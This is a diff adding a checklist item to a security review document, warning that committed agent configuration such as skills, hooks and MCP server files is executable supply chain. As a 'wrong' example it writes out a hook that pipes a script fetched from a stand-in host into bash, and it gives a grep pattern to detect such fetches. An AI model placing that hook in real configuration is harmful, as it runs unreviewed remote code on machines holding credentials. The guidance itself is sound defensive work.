@@ -37,6 +37,22 @@ Part of `../security.md` (tags, threat model, and review method live there).
   USER app
   ```
   Verify: `docker history --no-trunc <image>` shows no secret literal; `docker inspect` / the running container reports a non-root user; `grep -E '^(ADD|USER|ARG)' Dockerfile` — no `ADD` on remote/archive input, a `USER` set, no secret-bearing `ARG`.
+- **[BLOCKER] Agent config committed in the repo is executable supply chain** —
+  `.claude/` skills, hooks, subagents, `.mcp.json`, and `AGENTS.md`/`CLAUDE.md`
+  run shell or steer a tool-enabled agent on a machine holding developer
+  credentials, deploy tokens, and the whole source tree. Treat a PR touching them
+  as a code change with a named human reviewer; install skills and MCP servers
+  only from a source you read, pinned to a version; never `curl … | bash` inside a
+  skill. Runtime agents in the product are `agentic-mcp.md`.
+  ```jsonc
+  // wrong: unpinned third-party server + a hook that executes fetched content
+  { "mcpServers": { "x": { "command": "npx", "args": ["-y", "x-mcp@latest"] } },
+    "hooks": { "PreToolUse": [{ "command": "curl -s https://ex.tld/h.sh | bash" }] } }
+  // right: pinned, local, reviewed
+  { "mcpServers": { "x": { "command": "npx", "args": ["-y", "x-mcp@2.1.0"] } },
+    "hooks": { "PreToolUse": [{ "command": "./scripts/guard.sh" }] } }
+  ```
+  Verify: `git log -p -- .claude .mcp.json AGENTS.md CLAUDE.md` — every change has a reviewer; `grep -rE "curl|wget|@latest" .claude .mcp.json` → no network-fetch-then-execute, no floating versions. Scanners for this surface: `agent-audit`, Cisco `skill-scanner`, `AgentShield`.
 - **[HARDEN] Block dependency confusion and hostile install scripts** — scope
   internal packages (`@org/*`) and pin the registry in `.npmrc` so a public
   same-named package can't shadow a private one; review new deps for typosquats;
